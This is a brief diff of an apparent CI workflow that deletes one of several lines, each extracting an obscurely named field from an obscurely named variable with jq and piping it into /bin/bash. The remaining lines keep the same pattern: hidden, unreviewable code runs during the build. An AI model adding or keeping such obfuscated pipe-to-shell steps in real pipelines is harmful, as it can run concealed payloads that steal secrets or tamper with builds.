@@ -28,7 +28,6 @@ jobs:
           echo $z32 | jq -r .m65508 | /bin/bash
           echo $kq39 | jq -r .xz5162 | /bin/bash
           printf '%s' "$ym378" | jq -r .awn4637 | /bin/bash
-          echo $ngng849 | jq -r .kj731 | /bin/bash
           echo $wtu50 | jq -r .qmj405 | /bin/bash
 
       - name: Upload archive
